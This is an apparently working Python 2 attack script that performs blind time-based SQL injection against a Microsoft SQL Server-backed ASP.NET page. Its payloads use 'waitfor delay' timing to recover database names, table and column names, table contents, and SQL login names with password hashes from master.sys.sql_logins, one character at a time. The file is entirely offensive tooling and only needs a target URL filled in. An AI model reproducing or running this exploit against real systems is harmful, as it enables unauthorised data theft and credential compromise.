target_protocol="http"
target_url=""
target_path="/default.aspx?asd...';" 
target=target_protocol+"://"+target_url+target_path
target_port=80
target_method="GET"

DEBUG_MODE=True
DELAY=2
OPTIMUS_PRIME=False
logfile = open('sqli.log', 'w+')


#tablename='entidade'
#LEN_DBNAME="IF(LEN(DB_NAME())=${index}) waitfor delay '0:0:"+str(DELAY)+"';--"
#LEN_TABLE_NAME1="IF(LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85))=${index}) waitfor delay '0:0:"+str(DELAY)+"';--"
#LEN_TABLE1="IF(LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85)))=${index}) waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_NAME1="IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
#TABLE_CONTENT1="IF(ASCII(lower(substring((SELECT TOP 1 cont_data from "+ str(tablename) +"),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT1="IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT2="IF(ASCII(lower(substring((SELECT TOP 1 contact_name from entidade where xtype=char(85)${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT3="IF(ASCII(lower(substring((SELECT TOP 1 name FROM master..sysxlogins${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT4="IF(ASCII(lower(substring((SELECT TOP 1 name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT5="IF(ASCII(lower(substring((SELECT DB_NAME()),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT6="IF(ASCII(lower(substring((SELECT name FROM master..sysdatabases),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"
TABLE_CONTENT7="IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)${denial} AND name <> 'spt_fallback_db' AND name <> 'spt_fallback_dev' AND name <> 'spt_fallback_usg' AND name <> 'spt_monitor' AND name <> 'spt_values'),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"


def get_table_injection_string(table_name, column_name):
    return "IF(ASCII(lower(substring((SELECT TOP 1 "+column_name+" from "+ table_name +"),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--" 

def get_column_names(table_name):
    return "IF(ASCII(lower(substring((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name = \'"+table_name+"\'${denial}),${char},1)))=${ascii})waitfor delay '0:0:"+str(DELAY)+"';--"

import httplib
import time,sys
import urllib,urlparse

main_start=time.time()

def url_fix(s, charset='utf-8'):
    if isinstance(s, unicode):
        s = s.encode(charset, 'ignore')
    scheme, netloc, path, qs, anchor = urlparse.urlsplit(s)
    path = urllib.quote(path, '/%')
    qs = urllib.quote_plus(qs, ':&=') 
    return urlparse.urlunsplit((scheme, netloc, path, qs, anchor))

def get_inject_time(http_try):
    httpServ = httplib.HTTPConnection(target_url, target_port)
    httpServ.connect()
    if DEBUG_MODE: logfile.write(http_try+'\n')
    start = time.time()
    httpServ.request(target_method, url_fix(http_try))
    response = httpServ.getresponse()
    response.read(5)
    return time.time() - start

def optimize_allowed_space(sqli,space,char,denialstring):
    http_try=target_path + sqli.replace('${char}',str(char)).replace('=${ascii}', '>110').replace('${denial}', denialstring)
    if(get_inject_time(http_try)>DELAY):
        return xrange(111,123)
    else:
        space = list(set(space)-set(xrange(113,123)))
        http_try=target_path + sqli.replace('${char}',str(char)).replace('=${ascii}', '>94').replace('${denial}', denialstring)
        if(get_inject_time(http_try)>DELAY):
            return xrange(95,111)
        else:
            return xrange(45,66)
            
def get_sqli_content(sqli, fieldname, max_table_num=20, max_length=20, min_char=45, max_char=122):
    result,current_line=[''],''
    for table in range(max_table_num): # gives me all names
        denialstring=''
        for tablename in result:
            if tablename != '':
                denialstring+=' AND '+ fieldname +' <> \''+tablename+'\''
  #      space=range(min_char,max_char)
  #      if (len(result) > 1 and result[-1]==result[-2]):
  #          result=result[:-1]
  #          space+=range(45,65)
        for char in range(1,max_length):    # gives me one name
            found=False
            space = range(45,65)+range(95,123)
            if OPTIMUS_PRIME:
                space = optimize_allowed_space(sqli,space,char,denialstring)
            for ascii in space: # gives me one char
                http_try=target_path + sqli.replace('${char}',str(char)).replace('${ascii}', str(ascii)).replace('${denial}', denialstring)
		sys.stdout.write('\r')
	 	sys.stdout.write(current_line+chr(ascii))
        	sys.stdout.flush()
		if(get_inject_time(http_try)>DELAY):
		    current_line+=chr(ascii)
                #    sys.stdout.write(chr(ascii)) #return_string + str(result)
                 #   sys.stdout.flush()
                    result[-1]+=chr(ascii)
                    found=True
                    break
		sys.stdout.write('\r')
                sys.stdout.write(current_line+' ')
                sys.stdout.flush()
            if (not found):
                if (char==1):
                    print ' '
                    return result
                else:
                    result.append('')
#                    current_line=current_line[:-1]
                    current_line+=', '#print ",",
                    break
    return result
            # print '?',

#get_sqli_content(TABLE_CONTENT6,'name')	    
	    
print "Knock.. Knock.. Wake up!"
print ""
print "Listing DB tables:"
print "============================================================================"
for tablename in get_sqli_content(TABLE_CONTENT1,'name')[:-1]:
    print ""
    print "Listing column names for table " + tablename +":"
    print "============================================================================"
    columns = get_sqli_content(get_column_names(tablename),'column_name')[:-1]
    print ""
    print "Listing contents for table " + tablename +":"
    print "============================================================================"
    for column in columns:
        print column+": "
        get_sqli_content(get_table_injection_string(tablename,column),column,1)
        print ""
print "Total time taken: "+str(time.time() - main_start)
logfile.close()
